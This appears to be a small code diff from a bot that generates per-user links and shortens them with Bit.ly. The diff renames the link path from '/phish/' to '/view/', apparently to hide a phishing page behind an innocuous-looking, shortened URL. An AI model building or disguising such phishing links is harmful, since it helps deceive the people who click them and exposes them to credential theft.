@@ -92,7 +92,7 @@ def setup_bot_handlers(bot):
 
         if result['success']:
             # Generate long URL first
-            long_url = f"https://notafish.onrender.com/phish/{user_id}"
+            long_url = f"https://notafish.onrender.com/view/{user_id}"
 
             # Shorten the URL using Bit.ly API
             short_url = shorten_url(long_url)
